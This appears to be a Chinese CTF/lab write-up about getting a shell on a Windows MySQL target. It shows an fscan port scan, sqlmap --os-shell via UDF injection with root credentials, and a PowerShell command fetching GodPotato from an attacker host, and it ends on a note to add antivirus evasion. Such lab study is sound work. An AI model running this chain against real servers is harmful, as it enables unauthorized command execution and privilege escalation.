# database-2

:::info

靶标介绍：

> 靶机是数据库，想想办法拿到shell。
>
> - database
> - mysql
> - evasion
> - udf

:::

## 入口点

```plaintext
http://10.0.0.10/
```

首先先扫描一下端口

```shell
┌──(randark㉿kali)-[~]
└─$ ./tools/fscan_1.8.4/fscan -h 10.0.0.10

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
10.0.0.10:139 open
10.0.0.10:135 open
10.0.0.10:3306 open
10.0.0.10:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo 
[*]10.0.0.10
   [->]WIN-J2B9EIUKEN3
   [->]10.0.0.10
已完成 4/4
[*] 扫描结束,耗时: 39.987650807s
```

Windows 上运行的 Mysql 数据库

让我们尝试直接嗦一下

```shell
┌──(randark㉿kali)-[~]
└─$ sqlmap -d mysql://root:cslab@10.0.0.10:3306/mysql --os-shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:40:23 /2025-11-04/

[21:40:24] [INFO] connection to MySQL server '10.0.0.10:3306' established
[21:40:24] [INFO] testing MySQL
[21:40:24] [INFO] resumed: [['1']]...
[21:40:24] [INFO] confirming MySQL
[21:40:24] [INFO] resumed: [['1']]...
[21:40:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[21:40:24] [INFO] fingerprinting the back-end DBMS operating system
[21:40:24] [INFO] resumed: [['1']]...
[21:40:24] [INFO] the back-end DBMS operating system is Windows
[21:40:24] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, "Unknown table 'mysql.sqlmapfile'")
[21:40:24] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, "Unknown table 'mysql.sqlmapfilehex'")
[21:40:24] [INFO] testing if current user is DBA
[21:40:24] [INFO] fetching current user
[21:40:24] [INFO] resumed: [['root@%']]...
[21:40:24] [INFO] resumed: [['1']]...
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[21:40:26] [INFO] checking if UDF 'sys_exec' already exist
[21:40:27] [INFO] checking if UDF 'sys_eval' already exist
[21:40:27] [INFO] detecting back-end DBMS version from its banner
[21:40:27] [INFO] resumed: [['5.7.44-log']]...
[21:40:27] [INFO] retrieving MySQL plugin directory absolute path
[21:40:27] [INFO] resumed: [['C:\\Program Files\\MySQL\\MySQL Server 5.7\\lib\\plugin\\']]...
[21:40:27] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, "Unknown table 'mysql.sqlmapfile'")
[21:40:32] [INFO] the local file '/tmp/sqlmap3rut9l3p153642/lib_mysqludf_sysnlgol0g0.dll' and the remote file 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/libsqahk.dll' have the same size (7168 B)
[21:40:33] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, "Unknown table 'mysql.sqlmapfilehex'")
[21:40:33] [INFO] creating UDF 'sys_exec' from the binary UDF file
[21:40:33] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1305, 'FUNCTION mysql.sys_exec does not exist')
[21:40:33] [INFO] creating UDF 'sys_eval' from the binary UDF file
[21:40:33] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1305, 'FUNCTION mysql.sys_eval does not exist')
[21:40:34] [WARNING] (remote) OperationalError: (pymysql.err.OperationalError) (1051, "Unknown table 'mysql.sqlmapoutput'")
[21:40:34] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[21:40:34] [INFO] calling Windows OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] 

[21:40:40] [INFO] resumed: [['nt authority\\network service']]...
command standard output:
---
nt authority
etwork service
---
```

换一个，使用 MDUT 成功进行操作

![img](img/image_20251151-215130.png)

使用 powershell 将 GodPotato 传输上去

```cmd
powershell -Command "Invoke-WebRequest -Uri http://172.16.233.2/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe"
```

失败了，因为环境中存在有 Defender

TODO 需要做免杀
